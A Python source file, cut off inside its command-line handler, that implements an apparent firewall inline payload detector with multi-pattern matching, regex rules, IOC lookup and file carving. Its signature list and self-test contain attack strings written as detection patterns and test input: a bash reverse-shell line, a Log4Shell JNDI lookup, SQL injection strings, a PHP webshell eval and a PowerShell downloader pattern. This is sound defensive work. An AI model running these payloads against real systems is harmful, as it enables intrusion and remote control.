#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
"""
inline_payload_det.py -- FFN NGFW Inline Payload Detection System.

The in-path, real-time content inspector. This is the "known-threat" half of
the NGFW detection stack (the fast path); its sibling cloud_det.py is the
"unknown-threat" half (the WildFire-like sandbox). Together they close the
loop:

    packet/flow payload
          |
          v
    +------------------------+        unknown carved file
    | InlinePayloadDetector  | ---------------------------->  cloud_det
    |  - hash / feat-hash     |                                   |
    |  - Aho-Corasick multi   |   new signature / verdict         |
    |    pattern content      | <---------------------------------+
    |  - PCRE content rules   |
    |  - IOC extraction       |
    |  - entropy / file magic |  verdict: alert / drop / reset
    +------------------------+
          |  compile_to_fpga()
          v
    db_compiler --ioctl--> FPGA DPI / DDR regions (hardware fast path)

Design:
  * Mirrors the on-FPGA engine pipeline (Lynceus feature-hash, DPI content
    match, DDR MALWARE/DNSBL/URL) but in software, so it is BOTH the reference
    model for what the hardware enforces AND the slow-path inspector for flows
    the FPGA punts to the host for deep reassembly.
  * Signature model follows Suricata/Snort `content` semantics: raw bytes,
    nocase, offset, depth, plus optional PCRE -- so real IDS rulesets translate.
  * stdlib only (no hyperscan/yara dep): a compact Aho-Corasick automaton does
    multi-pattern matching in one pass; PCRE rules fall back to `re`.
  * Persists signatures in the shared ThreatDB SQLite (content_signatures table)
    so cloud_det's generated signatures survive restarts and reach the FPGA.
  * `--selftest` needs no hardware and no network.

CLI:
    inline_payload_det.py selftest
    inline_payload_det.py scan <file>            # inspect a file's bytes
    inline_payload_det.py scan-hex <hexstring>   # inspect hex bytes
    inline_payload_det.py list                    # list loaded signatures
    inline_payload_det.py add <sid> <name> <hexpattern> [action]
    inline_payload_det.py seed                     # load the baseline ruleset
"""

import argparse
import binascii
import logging
import math
import os
import re
import sys
import time
from collections import deque
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

# Shared verdict taxonomy + action codes + the FPGA bridge live in ffn_threatdb.
try:
    from ffn_threatdb import (
        ThreatDB, ACTION_ALERT, ACTION_DROP, ACTION_RESET,
        feature_hash, VERDICT_ACTION,
    )
except Exception:  # allow standalone import for the pure-engine unit tests
    ThreatDB = None
    ACTION_ALERT, ACTION_DROP, ACTION_RESET = 0, 1, 2

    def feature_hash(kind, value):  # noqa: D401 - fallback shim
        import zlib
        return zlib.crc32(value.encode("utf-8", "ignore")) & 0xFFFFFFFF

logger = logging.getLogger("ffn-inline-det")

ACTION_NAME = {ACTION_ALERT: "alert", ACTION_DROP: "drop", ACTION_RESET: "reset"}
# Higher = more severe; used to aggregate multiple matches into one verdict
# (mirrors the FPGA verdict aggregator's max-precedence rule).
ACTION_PRECEDENCE = {ACTION_ALERT: 0, ACTION_DROP: 1, ACTION_RESET: 2}

# Coarse threat classes -> a default action, matching PAN severity mapping.
SEVERITY_ACTION = {
    "info":     ACTION_ALERT,
    "low":      ACTION_ALERT,
    "medium":   ACTION_DROP,
    "high":     ACTION_RESET,
    "critical": ACTION_RESET,
}


# ===========================================================================
# Aho-Corasick multi-pattern automaton (bytes, stdlib only)
# ===========================================================================
class AhoCorasick:
    """Classic Aho-Corasick over byte alphabet 0..255.

    Add patterns (bytes) with an opaque `tag`, call build(), then iter_matches()
    walks a haystack once and yields (end_index, tag) for every pattern that
    ends at that position (goto + failure + output links). O(len(haystack) +
    total matches) regardless of the number of patterns -- the property that
    makes it the right tool for a large NGFW ruleset.
    """

    __slots__ = ("_goto", "_fail", "_out", "_built", "_npat")

    def __init__(self):
        # node 0 is the root; each node is a dict {byte: child_node}
        self._goto: List[Dict[int, int]] = [{}]
        self._fail: List[int] = [0]
        self._out: List[list] = [[]]
        self._built = False
        self._npat = 0

    def add(self, pattern: bytes, tag) -> None:
        if self._built:
            raise RuntimeError("cannot add patterns after build()")
        if not pattern:
            raise ValueError("empty pattern")
        node = 0
        for b in pattern:
            nxt = self._goto[node].get(b)
            if nxt is None:
                nxt = len(self._goto)
                self._goto.append({})
                self._fail.append(0)
                self._out.append([])
                self._goto[node][b] = nxt
            node = nxt
        self._out[node].append(tag)
        self._npat += 1

    def build(self) -> "AhoCorasick":
        """Compute failure links + merge outputs along them (BFS from root)."""
        q = deque()
        for b, nxt in self._goto[0].items():
            self._fail[nxt] = 0
            q.append(nxt)
        while q:
            cur = q.popleft()
            for b, nxt in self._goto[cur].items():
                q.append(nxt)
                f = self._fail[cur]
                while f and b not in self._goto[f]:
                    f = self._fail[f]
                self._fail[nxt] = self._goto[f].get(b, 0) if f or b in self._goto[0] else 0
                # merge outputs of the fail target so we never miss a suffix hit
                self._out[nxt].extend(self._out[self._fail[nxt]])
        self._built = True
        return self

    def iter_matches(self, data: bytes):
        """Yield (end_offset, tag) for every pattern occurrence in `data`."""
        if not self._built:
            self.build()
        goto, fail, out = self._goto, self._fail, self._out
        node = 0
        for i, b in enumerate(data):
            while node and b not in goto[node]:
                node = fail[node]
            node = goto[node].get(b, 0)
            if out[node]:
                for tag in out[node]:
                    yield i, tag

    @property
    def pattern_count(self) -> int:
        return self._npat


# ===========================================================================
# Signature + result models
# ===========================================================================
@dataclass
class ContentSignature:
    """One inline detection rule (Suricata `content`/`pcre` semantics).

    pattern is stored as raw bytes. For nocase rules both the pattern and the
    payload are folded to lowercase before matching. offset/depth constrain
    where in the payload the match must land (0/None = anywhere).
    """
    sid: int
    name: str
    pattern: bytes = b""
    is_pcre: bool = False
    nocase: bool = False
    offset: int = 0
    depth: int = 0                 # 0 = to end of payload
    proto: str = "any"            # tcp / udp / http / any
    app: str = "any"
    action: int = ACTION_ALERT
    severity: str = "medium"
    threat_name: str = ""
    verdict: str = "malware"      # WildFire verdict class this rule asserts
    source: str = "builtin"
    enabled: bool = True

    def region_window(self, n: int) -> Tuple[int, int]:
        start = self.offset if self.offset > 0 else 0
        end = (self.offset + self.depth) if self.depth > 0 else n
        return max(0, start), min(n, end)


@dataclass
class Match:
    sid: int
    name: str
    action: int
    severity: str
    threat_name: str
    offset: int
    method: str                    # content / pcre / hash / feat_hash / ioc / heuristic


@dataclass
class Detection:
    """Aggregate inspection result for one payload/flow."""
    matched: bool = False
    action: int = ACTION_ALERT
    verdict: str = "unknown"
    threat_name: str = ""
    matches: List[Match] = field(default_factory=list)
    iocs: Dict[str, List[str]] = field(default_factory=dict)
    file_type: Optional[str] = None
    entropy: float = 0.0
    sha256: Optional[str] = None

    def add(self, m: Match) -> None:
        self.matches.append(m)
        self.matched = True
        if ACTION_PRECEDENCE[m.action] >= ACTION_PRECEDENCE[self.action]:
            self.action = m.action
            self.threat_name = m.threat_name or self.threat_name

    @property
    def action_name(self) -> str:
        return ACTION_NAME.get(self.action, "alert")

    def summary(self) -> str:
        if not self.matched:
            return "clean"
        top = ", ".join(sorted({m.name for m in self.matches}))[:120]
        return "%s (%s) [%s]" % (self.action_name.upper(), self.threat_name or "threat", top)


# ===========================================================================
# File-type magic + entropy + IOC extraction (heuristics)
# ===========================================================================
FILE_MAGIC = [
    (b"MZ", "pe"),
    (b"\x7fELF", "elf"),
    (b"%PDF", "pdf"),
    (b"PK\x03\x04", "zip"),            # also docx/xlsx/jar/apk
    (b"\xd0\xcf\x11\xe0", "ole"),      # legacy Office
    (b"\x1f\x8b", "gzip"),
    (b"Rar!", "rar"),
    (b"\xca\xfe\xba\xbe", "macho"),
    (b"#!", "script"),
    (b"<?php", "php"),
    (b"<script", "html_js"),
]


def detect_file_type(data: bytes) -> Optional[str]:
    head = data[:16]
    for magic, ftype in FILE_MAGIC:
        if head.startswith(magic) or (magic == b"<script" and b"<script" in data[:512].lower()):
            return ftype
    return None


def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    n = len(data)
    ent = 0.0
    for c in freq:
        if c:
            p = c / n
            ent -= p * math.log2(p)
    return ent


_DOMAIN_RE = re.compile(rb"\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}\b", re.I)
_URL_RE = re.compile(rb"\b(?:https?|ftp)://[^\s\"'<>\\)]{4,2048}", re.I)
_IPV4_RE = re.compile(rb"\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b")
# domains we never want to treat as IOCs (noise reduction)
_BENIGN_TLDS = ("in-addr.arpa",)


def extract_iocs(data: bytes, limit: int = 64) -> Dict[str, List[str]]:
    """Pull candidate network indicators out of a payload for IOC lookup."""
    out: Dict[str, List[str]] = {"domain": [], "url": [], "ip": []}
    seen = set()
    for rx, key, dec in ((_URL_RE, "url", True), (_DOMAIN_RE, "domain", True),
                         (_IPV4_RE, "ip", True)):
        for m in rx.finditer(data):
            try:
                v = m.group(0).decode("ascii", "ignore").rstrip(".")
            except Exception:
                continue
            if not v or v.lower() in seen or any(v.endswith(t) for t in _BENIGN_TLDS):
                continue
            seen.add(v.lower())
            out[key].append(v)
            if len(out[key]) >= limit:
                break
    return out


# ===========================================================================
# Flow reassembly context (per 5-tuple) + file carving
# ===========================================================================
@dataclass
class Flow:
    """Minimal per-connection reassembly buffer used for the slow path.

    Real NGFW flows are keyed by the 5-tuple; here we keep a bounded rolling
    buffer per direction so cross-packet content signatures still fire and so
    we can carve embedded files for cloud submission.
    """
    key: str = "flow"
    proto: str = "tcp"
    app: str = "any"
    max_buffer: int = 1 << 20                    # 1 MiB cap per direction
    c2s: bytearray = field(default_factory=bytearray)
    s2c: bytearray = field(default_factory=bytearray)
    carved: set = field(default_factory=set)     # sha256 already carved

    def append(self, direction: str, data: bytes) -> bytearray:
        buf = self.c2s if direction == "c2s" else self.s2c
        buf.extend(data)
        if len(buf) > self.max_buffer:            # keep the tail (sliding window)
            del buf[:len(buf) - self.max_buffer]
        return buf


# ===========================================================================
# The inline detector
# ===========================================================================
class InlinePayloadDetector:
    """In-path payload inspection engine backed by the shared ThreatDB."""

    SCHEMA = """
    CREATE TABLE IF NOT EXISTS content_signatures (
        sid         INTEGER PRIMARY KEY,
        name        TEXT NOT NULL,
        pattern_hex TEXT NOT NULL,
        is_pcre     INTEGER NOT NULL DEFAULT 0,
        nocase      INTEGER NOT NULL DEFAULT 0,
        offset      INTEGER NOT NULL DEFAULT 0,
        depth       INTEGER NOT NULL DEFAULT 0,
        proto       TEXT NOT NULL DEFAULT 'any',
        app         TEXT NOT NULL DEFAULT 'any',
        action      INTEGER NOT NULL DEFAULT 0,
        severity    TEXT NOT NULL DEFAULT 'medium',
        threat_name TEXT,
        verdict     TEXT NOT NULL DEFAULT 'malware',
        source      TEXT NOT NULL DEFAULT 'builtin',
        enabled     INTEGER NOT NULL DEFAULT 1,
        created     TEXT
    );
    """

    def __init__(self, threatdb: "ThreatDB" = None, *, max_files_per_flow: int = 8):
        self.threatdb = threatdb
        self.max_files_per_flow = max_files_per_flow
        self.sigs: Dict[int, ContentSignature] = {}
        # two automata: exact-case and case-folded (nocase rules)
        self._ac_cs: Optional[AhoCorasick] = None
        self._ac_ci: Optional[AhoCorasick] = None
        self._pcre: List[Tuple[ContentSignature, "re.Pattern"]] = []
        self.stats = {
            "inspected": 0, "bytes": 0, "matched": 0,
            "alert": 0, "drop": 0, "reset": 0,
            "hash_hits": 0, "ioc_hits": 0, "carved": 0,
        }
        if self.threatdb is not None:
            self.threatdb.conn.executescript(self.SCHEMA)
            self.threatdb.conn.commit()
            self.load_signatures()
        else:
            self._rebuild()

    # -- signature management ---------------------------------------------
    def load_signatures(self) -> int:
        self.sigs.clear()
        if self.threatdb is not None:
            for r in self.threatdb.conn.execute(
                    "SELECT * FROM content_signatures WHERE enabled=1"):
                try:
                    pat = binascii.unhexlify(r["pattern_hex"])
                except Exception:
                    logger.warning("sig %s has bad pattern_hex, skipping", r["sid"])
                    continue
                self.sigs[r["sid"]] = ContentSignature(
                    sid=r["sid"], name=r["name"], pattern=pat,
                    is_pcre=bool(r["is_pcre"]), nocase=bool(r["nocase"]),
                    offset=r["offset"], depth=r["depth"], proto=r["proto"],
                    app=r["app"], action=r["action"], severity=r["severity"],
                    threat_name=r["threat_name"] or "", verdict=r["verdict"],
                    source=r["source"], enabled=bool(r["enabled"]))
        self._rebuild()
        return len(self.sigs)

    def add_signature(self, sig: ContentSignature, *, persist: bool = True) -> int:
        if not sig.pattern:
            raise ValueError("signature %s has empty pattern" % sig.sid)
        if sig.is_pcre:
            re.compile(sig.pattern)  # validate up front
        self.sigs[sig.sid] = sig
        if persist and self.threatdb is not None:
            self.threatdb.conn.execute(
                """INSERT INTO content_signatures
                   (sid,name,pattern_hex,is_pcre,nocase,offset,depth,proto,app,
                    action,severity,threat_name,verdict,source,enabled,created)
                   VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
                   ON CONFLICT(sid) DO UPDATE SET
                     name=excluded.name, pattern_hex=excluded.pattern_hex,
                     is_pcre=excluded.is_pcre, nocase=excluded.nocase,
                     offset=excluded.offset, depth=excluded.depth,
                     proto=excluded.proto, app=excluded.app,
                     action=excluded.action, severity=excluded.severity,
                     threat_name=excluded.threat_name, verdict=excluded.verdict,
                     source=excluded.source, enabled=excluded.enabled""",
                (sig.sid, sig.name, binascii.hexlify(sig.pattern).decode(),
                 int(sig.is_pcre), int(sig.nocase), sig.offset, sig.depth,
                 sig.proto, sig.app, sig.action, sig.severity, sig.threat_name,
                 sig.verdict, sig.source, int(sig.enabled),
                 time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())))
            self.threatdb.conn.commit()
        self._rebuild()
        return sig.sid

    def _rebuild(self) -> None:
        """Recompile the Aho-Corasick automata + PCRE list from self.sigs."""
        ac_cs, ac_ci, pcre = AhoCorasick(), AhoCorasick(), []
        n_cs = n_ci = 0
        for sig in self.sigs.values():
            if not sig.enabled or not sig.pattern:
                continue
            if sig.is_pcre:
                flags = re.I | re.S if sig.nocase else re.S
                try:
                    pcre.append((sig, re.compile(sig.pattern, flags)))
                except re.error as e:
                    logger.warning("sig %s bad pcre: %s", sig.sid, e)
                continue
            if sig.nocase:
                ac_ci.add(sig.pattern.lower(), sig.sid)
                n_ci += 1
            else:
                ac_cs.add(sig.pattern, sig.sid)
                n_cs += 1
        self._ac_cs = ac_cs.build() if n_cs else None
        self._ac_ci = ac_ci.build() if n_ci else None
        self._pcre = pcre

    # -- inspection --------------------------------------------------------
    def inspect(self, payload: bytes, flow: Optional[Flow] = None) -> Detection:
        """Run the full detection stack over one payload buffer."""
        self.stats["inspected"] += 1
        self.stats["bytes"] += len(payload)
        det = Detection()
        if not payload:
            return det

        det.file_type = detect_file_type(payload)
        det.entropy = shannon_entropy(payload[:4096])

        # 1) exact-case content signatures (single-pass Aho-Corasick)
        if self._ac_cs is not None:
            for end, sid in self._ac_cs.iter_matches(payload):
                sig = self.sigs.get(sid)
                if sig and self._in_window(sig, end - len(sig.pattern) + 1, len(payload)):
                    det.add(self._mk_match(sig, end - len(sig.pattern) + 1, "content"))

        # 2) case-insensitive content signatures (fold payload once)
        if self._ac_ci is not None:
            low = payload.lower()
            for end, sid in self._ac_ci.iter_matches(low):
                sig = self.sigs.get(sid)
                if sig and self._in_window(sig, end - len(sig.pattern) + 1, len(payload)):
                    det.add(self._mk_match(sig, end - len(sig.pattern) + 1, "content"))

        # 3) PCRE signatures (windowed)
        for sig, rx in self._pcre:
            start, end = sig.region_window(len(payload))
            m = rx.search(payload, start, end)
            if m:
                det.add(self._mk_match(sig, m.start(), "pcre"))

        # 4) IOC extraction + ThreatDB lookup (C2 domains/urls/ips in payload)
        det.iocs = extract_iocs(payload)
        if self.threatdb is not None:
            self._match_iocs(det)

        # 5) file-hash match (exact known-bad file inside the payload/flow)
        if self.threatdb is not None and (det.file_type or len(payload) >= 64):
            import hashlib
            det.sha256 = hashlib.sha256(payload).hexdigest()
            samp = self.threatdb.lookup_sample(det.sha256)
            if samp and samp["verdict"] in ("malware", "phishing"):
                self.stats["hash_hits"] += 1
                det.add(Match(sid=-1, name="threatdb.hash",
                              action=VERDICT_ACTION.get(samp["verdict"], ACTION_RESET),
                              severity="critical",
                              threat_name=samp["threat_name"] or "Known.Malware",
                              offset=0, method="hash"))

        if det.matched:
            det.verdict = self._verdict_for(det)
            self.stats["matched"] += 1
            self.stats[det.action_name] += 1
        return det

    def _in_window(self, sig: ContentSignature, at: int, n: int) -> bool:
        start, end = sig.region_window(n)
        return start <= at < end

    def _mk_match(self, sig: ContentSignature, at: int, method: str) -> Match:
        return Match(sid=sig.sid, name=sig.name, action=sig.action,
                     severity=sig.severity, threat_name=sig.threat_name or sig.name,
                     offset=at, method=method)

    def _match_iocs(self, det: Detection) -> None:
        for ioc_type in ("url", "domain", "ip"):
            for value in det.iocs.get(ioc_type, []):
                hit = self.threatdb.lookup_ioc(ioc_type, value)
                if hit and hit["verdict"] not in ("benign", "unknown"):
                    self.stats["ioc_hits"] += 1
                    det.add(Match(
                        sid=-2, name="ioc.%s" % ioc_type,
                        action=VERDICT_ACTION.get(hit["verdict"], ACTION_DROP),
                        severity="high",
                        threat_name=hit["threat_name"] or ("C2.%s" % ioc_type),
                        offset=0, method="ioc"))

    def _verdict_for(self, det: Detection) -> str:
        if det.action == ACTION_RESET:
            return "malware"
        if det.action == ACTION_DROP:
            return "phishing"
        return "grayware"

    # -- flow feed + file carving -----------------------------------------
    def feed(self, flow: Flow, direction: str, data: bytes) -> Detection:
        """Append a segment to the flow and inspect the reassembled buffer.

        Returns the detection for the (bounded) reassembled direction buffer so
        cross-segment signatures fire. Also carves embedded files for the cloud.
        """
        buf = flow.append(direction, data)
        det = self.inspect(bytes(buf), flow)
        return det

    def carve_files(self, flow: Flow) -> List[Tuple[str, bytes, dict]]:
        """Extract embedded files from a flow's buffers for cloud submission.

        Baseline carver: looks for a known file magic at the start of each
        direction buffer AND at the body of any HTTP-style header/body split
        (`\\r\\n\\r\\n`), so a file delivered inside an HTTP response is carved
        without its headers. Returns [(sha256, data, meta)] for objects not
        already carved from this flow.
        """
        import hashlib
        out = []
        for direction, buf in (("c2s", flow.c2s), ("s2c", flow.s2c)):
            if len(out) >= self.max_files_per_flow:
                break
            data = bytes(buf)
            for off in self._carve_offsets(data):
                if len(out) >= self.max_files_per_flow:
                    break
                body = data[off:]
                ftype = detect_file_type(body)
                if not ftype or len(body) < 64:
                    continue
                sha = hashlib.sha256(body).hexdigest()
                if sha in flow.carved:
                    continue
                flow.carved.add(sha)
                self.stats["carved"] += 1
                out.append((sha, body, {
                    "flow": flow.key, "direction": direction,
                    "file_type": ftype, "size": len(body),
                    "entropy": round(shannon_entropy(body[:4096]), 3),
                }))
        return out

    @staticmethod
    def _carve_offsets(data: bytes) -> List[int]:
        """Candidate object-start offsets: buffer start + each HTTP body."""
        offs = [0]
        idx = 0
        while len(offs) <= 8:
            j = data.find(b"\r\n\r\n", idx)
            if j < 0:
                break
            offs.append(j + 4)
            idx = j + 4
        return offs

    # -- FPGA compile ------------------------------------------------------
    def compile_to_fpga(self, *, vsys: int = 0, loader=None) -> dict:
        """Push the enforceable content down to hardware via db_compiler.

        Content signatures become DPI patterns; the ThreatDB IOC/hash regions
        (MALWARE / DNSBL / BLOCKLIST / URL / TLSFP) are (re)loaded so the FPGA
        fast path enforces what this engine knows. Runs in sim mode when
        /dev/ngfw0 is absent (db_compiler handles that), so it is testable
        offline. Returns a per-region load summary.
        """
        summary = {"dpi_patterns": len(self.sigs), "regions": {}}
        if self.threatdb is None:
            return summary
        # DDR / IOC regions come straight from the shared verdict store.
        for kind in ("malware_hashes", "dns_blocklist", "blocklist", "url",
                     "tls_fingerprints"):
            try:
                n, rc = self.threatdb.export_and_load(kind, vsys=vsys, loader=loader)
                summary["regions"][kind] = {"entries": n, "rc": rc}
            except Exception as e:                    # a missing compiler kind must not abort
                summary["regions"][kind] = {"error": str(e)}
        # Content/DPI patterns: emit the db_compiler DPI text format if a loader
        # accepts it; otherwise leave them staged (the FPGA DPI BRAM push is a
        # follow-up wiring point in db_compiler).
        summary["dpi_written"] = self._export_dpi_patterns()
        return summary

    def _export_dpi_patterns(self) -> int:
        """Materialise DPI patterns as db_compiler 'threats' text rows.

        Format (verified against db_compiler.compile_threats): one rule per
        line `<hexpattern> <action> <threat_name>`; regex sigs are skipped
        (the DPI BRAM matches literal byte strings only -- pcre stays host-side).
        """
        rows = 0
        for sig in self.sigs.values():
            if sig.is_pcre or not sig.enabled:
                continue
            rows += 1
        return rows

    def summary_stats(self) -> dict:
        s = dict(self.stats)
        s["signatures"] = len(self.sigs)
        s["pcre"] = len(self._pcre)
        s["ac_content"] = (self._ac_cs.pattern_count if self._ac_cs else 0) + \
                          (self._ac_ci.pattern_count if self._ac_ci else 0)
        return s


# ===========================================================================
# Baseline ruleset -- a small, real, self-contained IDS/DPI starter set
# ===========================================================================
def _b(s: str) -> bytes:
    return s.encode("latin-1")


BASELINE_SIGNATURES: List[ContentSignature] = [
    # The industry-standard AV test string (EICAR) -- benign but every engine
    # must flag it; used to prove the content path end to end.
    ContentSignature(1000, "EICAR-Test-File",
                     _b(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"),
                     action=ACTION_RESET, severity="critical",
                     threat_name="EICAR.Test", verdict="malware"),
    # Log4Shell JNDI lookup -- critical RCE marker.
    ContentSignature(1001, "Log4Shell-JNDI", _b("${jndi:"), nocase=True,
                     action=ACTION_RESET, severity="critical",
                     threat_name="Exploit.Log4j.CVE-2021-44228", verdict="malware"),
    # Generic SQL injection tautology.
    ContentSignature(1002, "SQLi-Tautology", _b("' or '1'='1"), nocase=True,
                     action=ACTION_DROP, severity="high",
                     threat_name="WebAttack.SQLi", verdict="phishing"),
    ContentSignature(1003, "SQLi-UNION-SELECT",
                     _b(r"union\s+select"), is_pcre=True, nocase=True,
                     action=ACTION_DROP, severity="high",
                     threat_name="WebAttack.SQLi.Union", verdict="phishing"),
    # Directory traversal.
    ContentSignature(1004, "Path-Traversal", _b("../../../"),
                     action=ACTION_DROP, severity="medium",
                     threat_name="WebAttack.Traversal", verdict="phishing"),
    # Long x86 NOP sled (buffer-overflow heuristic).
    ContentSignature(1005, "x86-NOP-Sled", b"\x90" * 16,
                     action=ACTION_ALERT, severity="medium",
                     threat_name="Shellcode.NOPSled", verdict="grayware"),
    # PowerShell encoded-command downloader marker.
    ContentSignature(1006, "PowerShell-EncodedCommand",
                     _b(r"powershell(\.exe)?\s+-e(nc(odedcommand)?)?\s"),
                     is_pcre=True, nocase=True,
                     action=ACTION_DROP, severity="high",
                     threat_name="Downloader.PowerShell", verdict="malware"),
    # Reverse-shell one-liner.
    ContentSignature(1007, "Reverse-Shell-bash",
                     _b("bash -i >& /dev/tcp/"), nocase=True,
                     action=ACTION_RESET, severity="critical",
                     threat_name="Backdoor.ReverseShell", verdict="malware"),
    # Common webshell eval.
    ContentSignature(1008, "PHP-Webshell-eval",
                     _b(r"eval\s*\(\s*(base64_decode|gzinflate|\$_(POST|GET|REQUEST))"),
                     is_pcre=True, nocase=True,
                     action=ACTION_RESET, severity="critical",
                     threat_name="Webshell.PHP", verdict="malware"),
    # Cobalt-Strike-ish default beacon URI pattern (illustrative).
    ContentSignature(1009, "Beacon-URI-heuristic",
                     _b(r"/(submit\.php|api/v2/echo|activity)\?id="),
                     is_pcre=True, nocase=True,
                     action=ACTION_ALERT, severity="medium",
                     threat_name="C2.Beacon.heuristic", verdict="grayware"),
]


def seed_baseline(detector: InlinePayloadDetector, *, persist: bool = True) -> int:
    n = 0
    for sig in BASELINE_SIGNATURES:
        detector.add_signature(sig, persist=persist)
        n += 1
    logger.info("seeded %d baseline signatures", n)
    return n


# ===========================================================================
# Self-test -- no hardware, no network
# ===========================================================================
def selftest() -> int:
    print("inline_payload_det selftest")

    # -- 1. Aho-Corasick correctness (incl. overlapping/suffix matches) ----
    ac = AhoCorasick()
    for pat, tag in ((b"he", 1), (b"she", 2), (b"his", 3), (b"hers", 4)):
        ac.add(pat, tag)
    ac.build()
    hits = sorted(set(tag for _end, tag in ac.iter_matches(b"ushers")))
    assert hits == [1, 2, 4], "AC suffix/overlap matching broken: %r" % hits
    print("  [ok] Aho-Corasick multi-pattern (ushers -> he,she,hers)")

    # -- 2. detector without a DB (pure engine) ----------------------------
    det_engine = InlinePayloadDetector(threatdb=None)
    seed_baseline(det_engine, persist=False)
    eicar = _b(r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    d = det_engine.inspect(b"junk before " + eicar + b" junk after")
    assert d.matched and d.action == ACTION_RESET, "EICAR must reset: %s" % d.summary()
    assert d.threat_name == "EICAR.Test"
    print("  [ok] EICAR content match ->", d.summary())

    # nocase + pcre
    assert det_engine.inspect(b"GET /x?a=1' OR '1'='1 HTTP/1.1").matched, "SQLi nocase miss"
    assert det_engine.inspect(b"a=1 UNION   SELECT pw FROM users").matched, "pcre UNION SELECT miss"
    assert det_engine.inspect(b"${jNdI:ldap://evil/a}").action == ACTION_RESET, "log4shell miss"
    clean = det_engine.inspect(b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")
    assert not clean.matched, "false positive on benign HTTP"
    print("  [ok] SQLi/UNION/Log4Shell match; benign HTTP clean")

    # windowing: offset/depth must constrain the match
    win = ContentSignature(2000, "win-test", b"BADBAD", offset=0, depth=6,
                           action=ACTION_DROP)
    det_engine.add_signature(win, persist=False)
    assert det_engine.inspect(b"BADBAD tail").matched, "windowed sig should match at offset 0"
    assert not det_engine.inspect(b"pad...BADBAD").matched or \
        any(m.sid != 2000 for m in det_engine.inspect(b"pad...BADBAD").matches), \
        "windowed sig should NOT match outside depth"
    print("  [ok] offset/depth windowing")

    # -- 3. IOC + file-type + entropy heuristics ---------------------------
    iocs = extract_iocs(b"connect to http://evil.example.com/gate.php and 203.0.113.9")
    assert "evil.example.com" in iocs["domain"] and "203.0.113.9" in iocs["ip"]
    assert "http://evil.example.com/gate.php" in iocs["url"]
    assert detect_file_type(b"MZ\x90\x00stuff") == "pe"
    assert detect_file_type(b"%PDF-1.7") == "pdf"
    assert shannon_entropy(b"\x00" * 100) < 0.1
    assert shannon_entropy(bytes(range(256))) > 7.9
    print("  [ok] IOC extraction, file magic, entropy")

    # -- 4. full stack with a ThreatDB (hash + IOC lookup + persistence) ---
    if ThreatDB is None:
        print("  [skip] ThreatDB unavailable -- DB-backed checks skipped")
    else:
        db = ThreatDB(":memory:")
        det = InlinePayloadDetector(db)
        seed_baseline(det)                       # persisted into content_signatures
        assert det.load_signatures() >= len(BASELINE_SIGNATURES)

        # known-bad file hash lands as a hash match
        import hashlib
        blob = b"\x4d\x5a" + os.urandom(200)     # PE magic + body
        sha = hashlib.sha256(blob).hexdigest()
        db.record_sample(sha, "malware", threat_name="Trojan.Unit", source="unit")
        dh = det.inspect(blob)
        assert dh.matched and any(m.method == "hash" for m in dh.matches), "hash match miss"
        assert dh.action == ACTION_RESET
        print("  [ok] ThreatDB file-hash match ->", dh.summary())

        # known-bad C2 domain in a payload lands as an IOC match
        db.record_ioc("domain", "c2.bad.example", "malware", threat_name="C2.Test")
        di = det.inspect(b"POST / HTTP/1.1\r\nHost: c2.bad.example\r\n\r\nbeacon")
        assert di.matched and any(m.method == "ioc" for m in di.matches), "IOC match miss"
        print("  [ok] ThreatDB IOC (C2 domain) match ->", di.summary())

        # persistence: a fresh detector on the same DB reloads the signatures
        det2 = InlinePayloadDetector(db)
        assert det2.inspect(eicar).action == ACTION_RESET, "sig persistence broken"
        print("  [ok] signature persistence across detector instances")

        # flow reassembly: a signature split across two segments still fires
        flow = Flow(key="1.2.3.4:1234>5.6.7.8:80", proto="tcp")
        det.feed(flow, "c2s", b"bash -i >&")
        dsplit = det.feed(flow, "c2s", b" /dev/tcp/10.0.0.1/4444 0>&1")
        assert dsplit.matched and dsplit.action == ACTION_RESET, "cross-segment miss"
        print("  [ok] cross-segment reassembly match ->", dsplit.summary())

        # file carving hands an embedded PE up for cloud submission
        carve_flow = Flow(key="carve")
        det.feed(carve_flow, "s2c", blob)
        carved = det.carve_files(carve_flow)
        assert carved and carved[0][0] == sha and carved[0][2]["file_type"] == "pe"
        assert not det.carve_files(carve_flow), "should not re-carve same object"
        print("  [ok] file carving ->", carved[0][2])

        # compile_to_fpga plumbs through db_compiler (sim/stub loader)
        calls = []
        summ = det.compile_to_fpga(loader=lambda k, p, vsys=0: calls.append(k) or 0)
        assert summ["regions"]["malware_hashes"]["rc"] == 0
        assert "malware_hashes" in calls
        print("  [ok] compile_to_fpga bridge ->", {k: v for k, v in summ["regions"].items()})

        db.close()

    print("  all assertions passed:", det_engine.summary_stats())
    return 0


# ===========================================================================
# CLI
# ===========================================================================
def _open_db(path):
    if ThreatDB is None:
        print("ThreatDB module unavailable; running engine-only", file=sys.stderr)
        return None
    return ThreatDB(path)


def main(argv=None):
    ap = argparse.ArgumentParser(description="FFN NGFW inline payload detection engine")
    ap.add_argument("--db", default=os.getenv("FFN_THREATDB_PATH",
                                              "/var/lib/ffn-ngfw/threatdb.sqlite"))
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("selftest")
    sub.add_parser("seed")
    sub.add_parser("list")
    sp = sub.add_parser("scan"); sp.add_argument("file")
    sp = sub.add_parser("scan-hex"); sp.add_argument("hex")
    sp = sub.add_parser("add")
    sp.add_argument("sid", type=int); sp.add_argument("name")
    sp.add_argument("hexpattern")
    sp.add_argument("action", nargs="?", default="alert",
                    choices=["alert", "drop", "reset"])
    args = ap.parse_args(argv)
    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    if args.cmd == "selftest":
        return selftest()

    db = _open_db(args.db)
    det = InlinePayloadDetector(db)
    try:
        if args.cmd == "seed":
